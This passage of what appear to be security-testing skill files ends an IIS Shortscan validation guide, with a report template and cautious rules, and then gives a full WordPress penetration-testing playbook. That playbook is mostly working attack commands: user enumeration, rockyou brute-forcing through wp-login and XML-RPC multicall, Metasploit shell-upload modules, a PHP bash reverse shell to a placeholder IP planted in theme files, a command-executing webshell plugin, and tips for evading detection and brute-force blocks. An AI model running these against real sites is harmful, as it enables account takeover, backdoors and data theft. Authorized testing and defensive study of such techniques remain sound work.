`shortscan_ignore.txt` starts with the four mandatory defaults. Add a pattern only when it is clearly standard framework/default content across targets. Never add `LOGIN`, `REPORT`, `ADMIN`, or any app-specific stem because one host returned a soft-404. Keep patterns uppercase, one per line, `sort -u` on update:

```bash
sort -u -o shortscan_ignore.txt shortscan_ignore.txt
```

## Phase 11 — Final report

Write `report.md`:

```text
==================================================
IIS SHORTSCAN VALIDATION
==================================================

Target:
<target>

URLs scanned:
<X>

Shortscan findings:
<X>

Ignored default/framework findings:
<X>

Potential application-specific findings:
<X>

Confirmed filenames:
<X>

Inconclusive:
<X>

--------------------------------------------------
IGNORED DEFAULTS
--------------------------------------------------

ASPNET_CLIENT
SYSTEM_WEB
2_0_50~1
4_0_30~1

--------------------------------------------------
INTERESTING FINDINGS
--------------------------------------------------

Short Name:
SHOWRE~1.ASP

Possible Name:
SHOWREPORT.ASPX

Confidence:
HIGH

URL:
https://example.com/SHOWREPORT.ASPX

Validation:
Confirmed / Likely / Inconclusive / False Positive

Evidence:
<short-name derivation, soft-404 comparison, status/size/title/content-type>

--------------------------------------------------
```

Include a separate INCONCLUSIVE section listing each unresolved short name, what blocked validation, and what would resolve it. End the chat reply with the confirmed/likely list and the exact global ignore patterns.

## Rules

1. Never trust "Vulnerable: Yes!" as a file finding.
2. Never treat an AI-generated filename as confirmed without HTTP validation.
3. Never conflate an 8.3 short name with the original filename.
4. Always establish and compare against a nonexistent-path baseline, including per-directory baselines.
5. Ignore the listed ASP.NET/IIS defaults and nested variants.
6. Do not report framework files as application findings.
7. Preserve the original Shortscan output; never modify the target.
8. Perform no destructive testing, credential submission, or data modification.
9. Clearly separate: detected short name → guessed filename → validated filename.
10. If the original name cannot be determined reliably, say so and use INCONCLUSIVE.
11. Do not fabricate filenames to make a report look complete.



---

## wordpress-penetration-testing

# WordPress Penetration Testing

## Purpose

Conduct comprehensive security assessments of WordPress installations including enumeration of users, themes, and plugins, vulnerability scanning, credential attacks, and exploitation techniques. WordPress powers approximately 35% of websites, making it a critical target for security testing.

## Prerequisites

### Required Tools
- WPScan (pre-installed in Kali Linux)
- Metasploit Framework
- Burp Suite or OWASP ZAP
- Nmap for initial discovery
- cURL or wget

### Required Knowledge
- WordPress architecture and structure
- Web application testing fundamentals
- HTTP protocol understanding
- Common web vulnerabilities (OWASP Top 10)

## Outputs and Deliverables

1. **WordPress Enumeration Report** - Version, themes, plugins, users
2. **Vulnerability Assessment** - Identified CVEs and misconfigurations
3. **Credential Assessment** - Weak password findings
4. **Exploitation Proof** - Shell access documentation

## Core Workflow

### Phase 1: WordPress Discovery

Identify WordPress installations:

```bash
# Check for WordPress indicators
curl -s http://target.com | grep -i wordpress
curl -s http://target.com | grep -i "wp-content"
curl -s http://target.com | grep -i "wp-includes"

# Check common WordPress paths
curl -I http://target.com/wp-login.php
curl -I http://target.com/wp-admin/
curl -I http://target.com/wp-content/
curl -I http://target.com/xmlrpc.php

# Check meta generator tag
curl -s http://target.com | grep "generator"

# Nmap WordPress detection
nmap -p 80,443 --script http-wordpress-enum target.com
```

Key WordPress files and directories:
- `/wp-admin/` - Admin dashboard
- `/wp-login.php` - Login page
- `/wp-content/` - Themes, plugins, uploads
- `/wp-includes/` - Core files
- `/xmlrpc.php` - XML-RPC interface
- `/wp-config.php` - Configuration (not accessible if secure)
- `/readme.html` - Version information

### Phase 2: Basic WPScan Enumeration

Comprehensive WordPress scanning with WPScan:

```bash
# Basic scan
wpscan --url http://target.com/wordpress/

# With API token (for vulnerability data)
wpscan --url http://target.com --api-token YOUR_API_TOKEN

# Aggressive detection mode
wpscan --url http://target.com --detection-mode aggressive

# Output to file
wpscan --url http://target.com -o results.txt

# JSON output
wpscan --url http://target.com -f json -o results.json

# Verbose output
wpscan --url http://target.com -v
```

### Phase 3: WordPress Version Detection

Identify WordPress version:

```bash
# WPScan version detection
wpscan --url http://target.com

# Manual version checks
curl -s http://target.com/readme.html | grep -i version
curl -s http://target.com/feed/ | grep -i generator
curl -s http://target.com | grep "?ver="

# Check meta generator
curl -s http://target.com | grep 'name="generator"'

# Check RSS feeds
curl -s http://target.com/feed/
curl -s http://target.com/comments/feed/
```

Version sources:
- Meta generator tag in HTML
- readme.html file
- RSS/Atom feeds
- JavaScript/CSS file versions

### Phase 4: Theme Enumeration

Identify installed themes:

```bash
# Enumerate all themes
wpscan --url http://target.com -e at

# Enumerate vulnerable themes only
wpscan --url http://target.com -e vt

# Theme enumeration with detection mode
wpscan --url http://target.com -e at --plugins-detection aggressive

# Manual theme detection
curl -s http://target.com | grep "wp-content/themes/"
curl -s http://target.com/wp-content/themes/
```

Theme vulnerability checks:
```bash
# Search for theme exploits
searchsploit wordpress theme <theme_name>

# Check theme version
curl -s http://target.com/wp-content/themes/<theme>/style.css | grep -i version
curl -s http://target.com/wp-content/themes/<theme>/readme.txt
```

### Phase 5: Plugin Enumeration

Identify installed plugins:

```bash
# Enumerate all plugins
wpscan --url http://target.com -e ap

# Enumerate vulnerable plugins only
wpscan --url http://target.com -e vp

# Aggressive plugin detection
wpscan --url http://target.com -e ap --plugins-detection aggressive

# Mixed detection mode
wpscan --url http://target.com -e ap --plugins-detection mixed

# Manual plugin discovery
curl -s http://target.com | grep "wp-content/plugins/"
curl -s http://target.com/wp-content/plugins/
```

Common vulnerable plugins to check:
```bash
# Search for plugin exploits
searchsploit wordpress plugin <plugin_name>
searchsploit wordpress mail-masta
searchsploit wordpress slideshow gallery
searchsploit wordpress reflex gallery

# Check plugin version
curl -s http://target.com/wp-content/plugins/<plugin>/readme.txt
```

### Phase 6: User Enumeration

Discover WordPress users:

```bash
# WPScan user enumeration
wpscan --url http://target.com -e u

# Enumerate specific number of users
wpscan --url http://target.com -e u1-100

# Author ID enumeration (manual)
for i in {1..20}; do
    curl -s "http://target.com/?author=$i" | grep -o 'author/[^/]*/'
done

# JSON API user enumeration (if enabled)
curl -s http://target.com/wp-json/wp/v2/users

# REST API user enumeration
curl -s http://target.com/wp-json/wp/v2/users?per_page=100

# Login error enumeration
curl -X POST -d "log=admin&pwd=wrongpass" http://target.com/wp-login.php
```

### Phase 7: Comprehensive Enumeration

Run all enumeration modules:

```bash
# Enumerate everything
wpscan --url http://target.com -e at -e ap -e u

# Alternative comprehensive scan
wpscan --url http://target.com -e vp,vt,u,cb,dbe

# Enumeration flags:
# at - All themes
# vt - Vulnerable themes
# ap - All plugins
# vp - Vulnerable plugins
# u  - Users (1-10)
# cb - Config backups
# dbe - Database exports

# Full aggressive enumeration
wpscan --url http://target.com -e at,ap,u,cb,dbe \
    --detection-mode aggressive \
    --plugins-detection aggressive
```

### Phase 8: Password Attacks

Brute-force WordPress credentials:

```bash
# Single user brute-force
wpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt

# Multiple users from file
wpscan --url http://target.com -U users.txt -P /usr/share/wordlists/rockyou.txt

# With password attack threads
wpscan --url http://target.com -U admin -P passwords.txt --password-attack wp-login -t 50

# XML-RPC brute-force (faster, may bypass protection)
wpscan --url http://target.com -U admin -P passwords.txt --password-attack xmlrpc

# Brute-force with API limiting
wpscan --url http://target.com -U admin -P passwords.txt --throttle 500

# Create targeted wordlist
cewl http://target.com -w wordlist.txt
wpscan --url http://target.com -U admin -P wordlist.txt
```

Password attack methods:
- `wp-login` - Standard login form
- `xmlrpc` - XML-RPC multicall (faster)
- `xmlrpc-multicall` - Multiple passwords per request

### Phase 9: Vulnerability Exploitation

#### Metasploit Shell Upload

After obtaining credentials:

```bash
# Start Metasploit
msfconsole

# Admin shell upload
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS target.com
set USERNAME admin
set PASSWORD jessica
set TARGETURI /wordpress
set LHOST <your_ip>
exploit
```

#### Plugin Exploitation

```bash
# Slideshow Gallery exploit
use exploit/unix/webapp/wp_slideshowgallery_upload
set RHOSTS target.com
set TARGETURI /wordpress
set USERNAME admin
set PASSWORD jessica
set LHOST <your_ip>
exploit

# Search for WordPress exploits
search type:exploit platform:php wordpress
```

#### Manual Exploitation

Theme/plugin editor (with admin access):

```php
// Navigate to Appearance > Theme Editor
// Edit 404.php or functions.php
// Add PHP reverse shell:

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'");
?>

// Or use weevely backdoor
// Access via: http://target.com/wp-content/themes/theme_name/404.php
```

Plugin upload method:

```bash
# Create malicious plugin
cat > malicious.php << 'EOF'
<?php
/*
Plugin Name: Malicious Plugin
Description: Security Testing
Version: 1.0
*/
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
EOF

# Zip and upload via Plugins > Add New > Upload Plugin
zip malicious.zip malicious.php

# Access webshell
curl "http://target.com/wp-content/plugins/malicious/malicious.php?cmd=id"
```

### Phase 10: Advanced Techniques

#### XML-RPC Exploitation

```bash
# Check if XML-RPC is enabled
curl -X POST http://target.com/xmlrpc.php

# List available methods
curl -X POST -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' http://target.com/xmlrpc.php

# Brute-force via XML-RPC multicall
cat > xmlrpc_brute.xml << 'EOF'
<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params>
<param><value><array><data>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>password1</string></value>
</data></array></value></member>
</struct></value>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>password2</string></value>
</data></array></value></member>
</struct></value>
</data></array></value></param>
</params>
</methodCall>
EOF

curl -X POST -d @xmlrpc_brute.xml http://target.com/xmlrpc.php
```

#### Scanning Through Proxy

```bash
# Use Tor proxy
wpscan --url http://target.com --proxy socks5://127.0.0.1:9050

# HTTP proxy
wpscan --url http://target.com --proxy http://127.0.0.1:8080

# Burp Suite proxy
wpscan --url http://target.com --proxy http://127.0.0.1:8080 --disable-tls-checks
```

#### HTTP Authentication

```bash
# Basic authentication
wpscan --url http://target.com --http-auth admin:password

# Force SSL/TLS
wpscan --url https://target.com --disable-tls-checks
```

## Quick Reference

### WPScan Enumeration Flags

| Flag | Description |
|------|-------------|
| `-e at` | All themes |
| `-e vt` | Vulnerable themes |
| `-e ap` | All plugins |
| `-e vp` | Vulnerable plugins |
| `-e u` | Users (1-10) |
| `-e cb` | Config backups |
| `-e dbe` | Database exports |

### Common WordPress Paths

| Path | Purpose |
|------|---------|
| `/wp-admin/` | Admin dashboard |
| `/wp-login.php` | Login page |
| `/wp-content/uploads/` | User uploads |
| `/wp-includes/` | Core files |
| `/xmlrpc.php` | XML-RPC API |
| `/wp-json/` | REST API |

### WPScan Command Examples

| Purpose | Command |
|---------|---------|
| Basic scan | `wpscan --url http://target.com` |
| All enumeration | `wpscan --url http://target.com -e at,ap,u` |
| Password attack | `wpscan --url http://target.com -U admin -P pass.txt` |
| Aggressive | `wpscan --url http://target.com --detection-mode aggressive` |

## Constraints and Limitations

### Legal Considerations
- Obtain written authorization before testing
- Stay within defined scope
- Document all testing activities
- Follow responsible disclosure

### Technical Limitations
- WAF may block scanning
- Rate limiting may prevent brute-force
- Some plugins may have false negatives
- XML-RPC may be disabled

### Detection Evasion
- Use random user agents: `--random-user-agent`
- Throttle requests: `--throttle 1000`
- Use proxy rotation
- Avoid aggressive modes on monitored sites

## Troubleshooting

### WPScan Shows No Vulnerabilities

**Solutions:**
1. Use API token for vulnerability database
2. Try aggressive detection mode
3. Check for WAF blocking scans
4. Verify WordPress is actually installed

### Brute-Force Blocked

**Solutions:**
1. Use XML-RPC method instead of wp-login
2. Add throttling: `--throttle 500`
3. Use different user agents
4. Check for IP blocking/fail2ban

### Cannot Access Admin Panel

**Solutions:**
1. Verify credentials are correct
2. Check for two-factor authentication
3. Look for IP whitelist restrictions
4. Check for login URL changes (security plugins)


